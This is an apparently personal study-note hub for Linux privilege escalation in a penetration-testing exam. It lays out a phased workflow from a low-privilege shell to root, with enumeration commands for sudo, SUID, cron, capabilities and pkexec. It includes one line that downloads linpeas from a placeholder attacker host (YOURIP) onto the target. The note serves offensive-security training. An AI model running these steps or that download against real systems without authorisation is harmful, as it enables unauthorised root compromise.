# 🐧 Linux Privilege Escalation (Hub)

> You have a low-priv Linux shell (`www-data`, a user). Goal: **root**. This is the index — run the quick checks below, then jump to the per-technique note for whatever looks promising. Upgrade to a TTY first ([[Shells]]).

Related: [[Shells]] · [[Credential Attacks]] · [[Pivoting and Port Forwarding]]

---

## 🧭 EXAM WORKFLOW — low-priv shell → root
Work top-to-bottom. When a row gives a positive finding, stop broad enumeration and validate that route before continuing. Keep a kernel exploit as a last resort.

| Phase | Test first | Positive finding → use | If not found → continue |
|---|---|---|---|
| 0. Stabilise | `id`, hostname, OS, groups | record architecture, distribution, groups, and shell context | 1 |
| 1. Sudo + pkexec | `sudo -l`; record `pkexec` package/version | allowed sudo route → [[Sudo Abuse]]; vulnerable PwnKit evidence → [[Linux Kernel Exploits]] | 2 |
| 2. Group / container rights | `id` and group membership | usable `docker`/`lxd` membership → [[Docker & LXD Privesc]] | 3 |
| 3. SUID / SGID | enumerate non-standard SUID/SGID binaries | GTFOBin, writable path, or injection candidate → [[SUID & SGID]] | 4 |
| 4. Scheduled work | cron plus timers, `at`, anacron, backup/logrotate config | privileged task invokes writable target → [[Cron Jobs]] / [[Systemd, Timers & Maintenance Jobs]] | 5 |
| 5. Credentials | histories, keys, configs, other-user files | usable password/key → [[Linux Credential Hunting]] / [[Credential Attacks]] | 6 |
| 6. Capabilities | file capabilities | `cap_setuid` or useful read/write capability → [[Linux Capabilities]] | 7 |
| 7. Writable privileged paths | services, scripts, PATH, `/etc/passwd`, libraries/plugins | privileged consumer uses writable target → [[Writable Files & PATH Hijack]] / [[Polkit, Libraries & App-Specific Paths]] | 8 |
| 8. Network filesystem | mounted/exported NFS | `no_root_squash` export → [[NFS]] | 9 |
| 9. Kernel LPE last | exact OS/build, architecture, and package patch status | applicable, stable LPE evidence → [[Linux Kernel Exploits]] | document / re-enumerate |

### Recommended command order
```bash
id
```
```bash
sudo -l
```
```bash
command -v pkexec; pkexec --version 2>/dev/null
```
```bash
find / -perm -4000 -type f 2>/dev/null
```
```bash
cat /etc/crontab; ls -la /etc/cron.*
```
```bash
systemctl list-timers --all; atq; cat /etc/anacrontab 2>/dev/null
```
```bash
getcap -r / 2>/dev/null
```
```bash
./linpeas.sh | tee linpeas.txt
```

Check `pkexec` early, but do not assume it is vulnerable from its presence alone. Use `pspy` while checking scheduled-process behavior. Do not use a kernel exploit until phases 1–8 have no viable route.

## ⚡ FIRST 5 COMMANDS (fast wins)
```bash
id ; whoami ; hostname
```
```bash
sudo -l
```
```bash
uname -a ; cat /etc/os-release
```
```bash
find / -perm -4000 -type f 2>/dev/null
```
```bash
cat /etc/crontab ; ls -la /etc/cron.*
```
Then drop and run an automated enumerator while you read the output.

## 🤖 AUTOMATED ENUM
```bash
./linpeas.sh | tee linpeas.txt          # the big one
```
```bash
./pspy64                                 # watch cron/processes live (no root needed)
```
Also: `lse.sh -l1`, `linenum.sh`. Transfer with `wget http://YOURIP/linpeas.sh` (start `python3 -m http.server 80` on Kali) — see [[File Transfer Cheat Sheet]].

---

## 🎯 TECHNIQUES (priority order — click into each)
| # | Technique | Note | Prob |
|---|---|---|---|
| 1 | Misconfigured sudo → GTFOBins / LD_PRELOAD / sudo CVEs | [[Sudo Abuse]] | 🟢 |
| 2 | SUID/SGID → GTFOBins / PATH hijack / injection | [[SUID & SGID]] | 🟢 |
| 3 | Cron: writable script / relative PATH / wildcard | [[Cron Jobs]] | 🟢 |
| 4 | systemd timers / `at` / anacron / backups / logrotate | [[Systemd, Timers & Maintenance Jobs]] | 🟡 |
| 5 | Credentials & keys on disk → reuse/`su` | [[Linux Credential Hunting]] | 🟢 |
| 6 | Capabilities (`cap_setuid`, file R/W caps) | [[Linux Capabilities]] | 🟡 |
| 7 | Writable `/etc/passwd`/service + PATH/library/plugin path | [[Writable Files & PATH Hijack]] / [[Polkit, Libraries & App-Specific Paths]] | 🟡 |
| 8 | `docker`/`lxd` group → mount host `/` | [[Docker & LXD Privesc]] | 🟢 (if usable) |
| 9 | Verified `pkexec` PwnKit + kernel CVEs | [[Linux Kernel Exploits]] | 🟡 (last) |
| — | NFS `no_root_squash` (remote SUID drop) | [[NFS]] | 🔵 |

## 🔁 FOUND → NEXT (router)
| FINDING | GO |
|---|---|
| `sudo -l` allows a binary | [[Sudo Abuse]] |
| Non-standard SUID | [[SUID & SGID]] |
| Root cron + writable script | [[Cron Jobs]] |
| systemd timer / maintenance job with writable target | [[Systemd, Timers & Maintenance Jobs]] |
| verified vulnerable `pkexec` / old unpatched kernel | [[Linux Kernel Exploits]] |
| Password/key on disk | [[Linux Credential Hunting]] |
| `getcap` shows `cap_setuid` | [[Linux Capabilities]] |
| Writable `/etc/passwd` or service | [[Writable Files & PATH Hijack]] |
| writable policy, library, plugin, or app config used by root | [[Polkit, Libraries & App-Specific Paths]] |
| `id` shows docker/lxd | [[Docker & LXD Privesc]] |

## 🚧 STUCK?
Re-read linpeas fully; run `pspy` for hidden cron; check **other users'** files (`/home/*`, `/opt`, `/var/www`); try `pkexec`/PwnKit; hunt creds harder. Then → [[Stuck — What Now]].

## ⚠️ COMMON MISTAKES
- Not running `sudo -l` first · ignoring `pkexec`/PwnKit · missing cron (didn't run `pspy`) · only checking your own home · jumping to kernel exploits before config wins · not upgrading to a TTY.

## 📇 QUICK ORDER
`sudo -l` + check `pkexec` → groups → SUID → cron/timers (pspy) → creds → caps → writable files/libraries → docker/lxd → NFS → verified kernel route.
See [[Privilege Escalation Cheat Sheet]] for the condensed command list.
